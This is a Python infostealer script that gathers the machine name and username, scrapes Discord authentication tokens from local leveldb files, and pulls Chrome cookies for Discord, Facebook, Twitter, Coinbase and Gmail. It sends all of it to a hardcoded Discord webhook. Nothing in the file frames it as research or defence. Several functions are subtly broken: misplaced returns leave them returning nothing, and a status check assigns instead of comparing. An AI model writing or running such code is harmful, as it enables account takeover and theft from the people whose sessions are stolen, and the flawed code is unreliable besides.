import platform
import os
import getpass
import requests
import json
import glob
import shutil
import re
from pathlib import Path
import browser_cookie3

WU = "https://discord.com/api/webhooks/1373044070909345913/7N9FYtGrNJUmS7iH8FEEdxuLEjzxPtd677JC1DqAVgjb7lGfvGi17lo0r0GIAhpTFBMU"

def get_info():
    data = []
    data.append(f"PC Name: {platform.node()}")
    data.append(f"User: {getpass.getuser()}")
    return data
def get_tokens():
    data = []
    try:
        discord_path = os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb")
        if not os.path.exists(discord_path):
            data.append("No Discord")
    except Exception as e:
        data.append(f"Error getting tokens: {str(e)}")
    temp_path = os.path.join(os.getenv("TEMP"), "discord_leveldb")
    if os.path.exists(temp_path):
        try:
            shutil.rmtree(temp_path)
        except Exception as e:
            data.append(f"Error cleaning temp directory: {str(e)}")
            return data
        shutil.copytree(discord_path, temp_path)
        for file in glob.glob(os.path.join(temp_path, "*.ldb")):
            try:
                with open(file, "rb") as f:
                    content = f.read().decode("utf-8", errors="ignore")
                    tokens = re.findall(r"[\w-]{24,32}\.[\w-]{6}\.[\w-]{27}", content)
                for token in tokens:
                    data.append(f"Token: {token}")
            except Exception as e:
                data.append("Error reading file")
            try:
                shutil.rmtree(temp_path)
            except Exception as e:
                data.append("Couldnt clean temp path")
                if not data:
                    data.append("No Tokens found")
def get_cookies():
    data = []
    try: 
        cookies = browser_cookie3.chrome(domain_name="")
        for cookie in cookies:
            if any(domain in cookie.domain for domain in [".discord.com", ".facebook.com", ".twitter.com", ".coinbase.com", ".gmail.com"]):
                data.append(f"Cookie: {cookie.name}={cookie.value} (Domain: {cookie.domain})")
                if not data:
                    data.append("No cookies found")
    except Exception as e:
        data.append(f"error: {str(e)}")
        return data
def send_to_webook(data):
    result = False
    try:
        payload = {"content": f"```\n{data}\n```"}
        response = requests.post(WU, json=payload)
        result = response.status_code = 204
    except Exception as e:
        print(f"didnt send 2 webhook xddxdxd")
        return result
    

def main():
    collected_data = []
    collected_data.extend(get_info())
    collected_data.extend(get_cookies())
    collected_data.extend(get_tokens())

    data3 = "\n".join(collected_data)
    if send_to_webook(data3):
        print("sent 2 webhook xd")
    else:
        print("didnt send 2 webhook")
if __name__ == "__main__":
    main()
            
        